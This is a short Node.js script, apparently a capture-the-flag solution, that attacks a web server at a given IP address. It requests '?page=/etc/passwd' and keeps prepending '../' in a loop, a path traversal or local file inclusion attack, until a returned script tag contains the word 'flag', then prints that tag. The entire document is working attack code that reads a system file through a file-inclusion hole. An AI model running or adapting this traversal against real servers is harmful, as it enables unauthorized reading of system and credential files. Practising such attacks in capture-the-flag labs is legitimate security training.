import fetch from 'node-fetch';

async function getPage(url) {
    const response = await fetch(url);
    return await response.text();
}

async function main(ipAddress) {
    if (!ipAddress) {
        console.error('Please provide only an IP address as a parameter.');
        process.exit(1);
    }

    const baseUrl = `http://${ipAddress}/?page=/`;
    let pageVar = "etc/passwd";

    while (true) {
        const url = baseUrl + pageVar;
        const response = await getPage(url);
        const scriptTags = response.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi);
        if (scriptTags) {
            for (let i = 0; i < scriptTags.length; i++) {
                if (scriptTags[i].includes("flag")) {
                    console.log(scriptTags[i]);
                    return scriptTags[i];
                }
            }
        }
        pageVar = "../" + pageVar;
    }
}

if (process.argv.length !== 3) {
    console.error('Please provide only an IP address as a parameter.');
    process.exit(1);
}
const ipAddress = process.argv[2];
main(ipAddress).catch((err) => console.error(err));